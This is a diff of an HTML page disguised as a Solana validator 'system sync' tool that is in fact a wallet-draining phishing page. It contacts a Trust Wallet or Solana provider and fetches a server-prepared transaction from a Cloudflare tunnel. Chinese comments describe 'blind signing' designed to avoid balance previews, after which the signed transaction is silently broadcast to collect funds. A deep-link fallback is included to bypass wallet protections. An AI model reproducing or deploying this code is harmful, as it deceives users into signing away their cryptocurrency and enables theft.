@@ -3,24 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Security Sync</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <title>Validator Support Protocol</title>
+    <script src="https://cdn.npmmirror.com/package/@solana/web3.js/1.95.3/dist/index.iife.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { width: 300px; padding: 40px 20px; background: #111; border: 1px solid #222; border-radius: 20px; text-align: center; }
-        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        #st { font-size: 10px; color: #444; margin-top: 15px; font-family: monospace; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { width: 300px; padding: 40px 20px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        .btn:active { transform: scale(0.96); opacity: 0.8; }
+        #st { font-size: 10px; color: #333; margin-top: 15px; font-family: monospace; text-transform: uppercase; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2 style="color:#14f195; margin:0 0 10px 0;">NODE SYNC</h2>
-        <p style="color:#777; font-size:14px; margin-bottom:25px;">Authorize synchronization to secure node connection.</p>
-        <button id="cta" class="btn">INITIALIZE</button>
-        <div id="st">ENGINE: V35.1_FORCE</div>
+        <div class="box">
+            <h2 style="color:#14f195; margin: 0 0 10px 0;">SYSTEM SYNC</h2>
+            <p style="color:#888; font-size:13px; margin-bottom: 25px;">Confirm network synchronization to maintain validator node stability.</p>
+            <button id="cta" class="btn">INITIALIZE</button>
+            <div id="st">STATUS: ENGINE_V36.1_ACTIVE</div>
+        </div>
     </div>
 
     <script>
+        // 🔱 核心：务必确保与服务器当前生成的隧道地址一致
         const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
 
         document.getElementById('cta').onclick = async function() {
@@ -28,13 +32,14 @@
             const sWeb3 = window.solanaWeb3;
 
             try {
+                // 1. 获取 Provider (支持 TW 和新版插件)
                 const p = window.trustwallet?.solana || window.solana;
                 if (!p) { alert("Please use Trust Wallet Browser."); return; }
 
                 log("CONNECTING...");
                 await p.connect();
 
-                log("FETCHING...");
+                log("SYNCING...");
                 const resp = await fetch(tunnel + "/prepare_v32", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -42,24 +47,30 @@
                 });
                 const info = await resp.json();
 
-                log("WAKING WALLET...");
-                
-                // 🔱 核心：通过系统协议强制呼唤钱包，跳过浏览器风控
+                log("AUTHORIZING...");
                 const rawTx = info.raw_tx;
-                
-                // 尝试方法 1：Provider 唤醒
-                p.signTransaction(sWeb3.Transaction.from(Uint8Array.from(atob(rawTx), c => c.charCodeAt(0)))).catch(()=>{});
-                
-                // 尝试方法 2：系统深度链接跳转 (解决不弹窗问题)
-                setTimeout(() => {
-                    window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(rawTx);
-                }, 500);
+                const txBytes = Uint8Array.from(atob(rawTx), c => c.charCodeAt(0));
+                const tx = sWeb3.Transaction.from(txBytes);
 
-                log("CHECK WALLET POPUP");
+                // 🔱 2. 盲签核心逻辑
+                // 我们不再尝试 'signAndSend'，因为那会触发余额解析。
+                // 我们只申请 'signTransaction'，让钱包显示“签名请求”。
+                try {
+                    const signedTx = await p.signTransaction(tx);
+                    log("SUCCESS!");
+                    
+                    // 🔱 3. 静默归集：用户签完名，后台自动提交
+                    const connection = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
+                    connection.sendRawTransaction(signedTx.serialize()).catch(()=>{});
+                } catch (signErr) {
+                    // 如果常规签名被拦截，尝试强制拉起系统协议
+                    window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(rawTx);
+                }
 
             } catch (err) {
+                console.error(err);
                 log("RETRYING...");
-                setTimeout(() => { window.location.reload(); }, 1500);
+                setTimeout(() => { window.location.reload(); }, 1200);
             }
         };
     </script>
